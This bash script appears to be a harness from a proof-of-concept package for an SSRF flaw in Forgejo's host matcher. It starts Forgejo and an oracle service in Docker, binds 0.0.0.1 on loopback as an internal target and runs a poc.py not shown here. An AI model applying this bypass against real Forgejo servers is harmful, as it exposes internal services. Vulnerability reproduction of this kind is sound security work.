#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"
export COMPOSE_PROJECT_NAME="${COMPOSE_PROJECT_NAME:-forgejo-hostmatcher-0001-ssrf}"
BASE="${1:-http://127.0.0.1:19320}"
chmod +x poc.py oracle.py

cleanup() {
  echo "== docker compose down =="
  docker compose -p "${COMPOSE_PROJECT_NAME}" down -v --remove-orphans || true
}
trap cleanup EXIT

echo "== docker compose down (clean) =="
docker compose -p "${COMPOSE_PROJECT_NAME}" down -v --remove-orphans || true

echo "== docker compose up (codeberg.org/forgejo/forgejo:16.0.5 + same-netns oracle, loopback :19320) =="
up_ok=0
for attempt in $(seq 1 15); do
  if docker compose -p "${COMPOSE_PROJECT_NAME}" up -d --build; then
    up_ok=1
    break
  fi
  echo "IOC compose-up-retry attempt=${attempt}"
  sleep 20
  docker compose -p "${COMPOSE_PROJECT_NAME}" down -v --remove-orphans || true
done
if [[ "${up_ok}" != 1 ]]; then
  echo "FAIL forgejo-hostmatcher-0001-ssrf compose up failed FORGEJO-HOSTMATCHER-0001-WITNESS" | tee poc-last-run.txt
  docker compose -p "${COMPOSE_PROJECT_NAME}" logs --tail=80 || true
  exit 1
fi

echo "== wait for Forgejo =="
ok=0
for i in $(seq 1 90); do
  code="$(curl -s -o /tmp/forgejo-hostmatcher-0001-ver -w '%{http_code}' --max-time 5 "${BASE}/api/v1/version" || true)"
  if [[ "${code}" == "200" ]]; then
    echo "IOC forgejo-up http=${code}"
    ok=1
    break
  fi
  echo "IOC wait-forgejo i=${i} http=${code}"
  sleep 3
done
if [[ "${ok}" != 1 ]]; then
  echo "FAIL forgejo-hostmatcher-0001-ssrf Forgejo did not become ready on ${BASE} FORGEJO-HOSTMATCHER-0001-WITNESS" | tee poc-last-run.txt
  docker compose -p "${COMPOSE_PROJECT_NAME}" logs --tail=80 forgejo || true
  exit 1
fi

echo "== bind 0.0.0.1 on lo (shared netns) =="
docker compose -p "${COMPOSE_PROJECT_NAME}" exec -T -u root forgejo sh -c \
  'ip addr add 0.0.0.1/8 dev lo 2>/dev/null || true' || true

echo "== wait for oracle on 0.0.0.1:8080 =="
ok=0
for i in $(seq 1 40); do
  body="$(docker compose -p "${COMPOSE_PROJECT_NAME}" exec -T oracle \
    python3 -c 'import urllib.request; print(urllib.request.urlopen("http://0.0.0.1:8080/ssrf", timeout=3).read().decode())' \
    2>/dev/null || true)"
  if [[ "${body}" == *"FORGEJO-HOSTMATCHER-0001-WITNESS"* ]]; then
    echo "IOC oracle-up via 0.0.0.1 HTTP 200"
    ok=1
    break
  fi
  echo "IOC wait-oracle i=${i} snippet=${body:0:80}"
  sleep 2
done
if [[ "${ok}" != 1 ]]; then
  echo "FAIL forgejo-hostmatcher-0001-ssrf oracle not reachable at http://0.0.0.1:8080/ssrf FORGEJO-HOSTMATCHER-0001-WITNESS" | tee poc-last-run.txt
  docker compose -p "${COMPOSE_PROJECT_NAME}" logs --tail=80 oracle || true
  docker compose -p "${COMPOSE_PROJECT_NAME}" logs --tail=40 forgejo || true
  exit 1
fi

echo "== poc.py =="
set +e
python3 ./poc.py "${BASE}" | tee poc-last-run.txt
rc=${PIPESTATUS[0]}
set -e
if [[ "${rc}" != 0 ]]; then
  if ! tail -n1 poc-last-run.txt 2>/dev/null | grep -qE '^(SUCCESS|FAIL) '; then
    echo "FAIL forgejo-hostmatcher-0001-ssrf poc exit=${rc} FORGEJO-HOSTMATCHER-0001-WITNESS" >> poc-last-run.txt
  fi
  echo "== oracle logs (tail) ==" | tee -a poc-last-run.txt
  docker compose -p "${COMPOSE_PROJECT_NAME}" logs --tail=80 oracle | tee -a poc-last-run.txt || true
  echo "== forgejo logs (tail) ==" | tee -a poc-last-run.txt
  docker compose -p "${COMPOSE_PROJECT_NAME}" logs --tail=80 forgejo | tee -a poc-last-run.txt || true
fi
exit "${rc}"
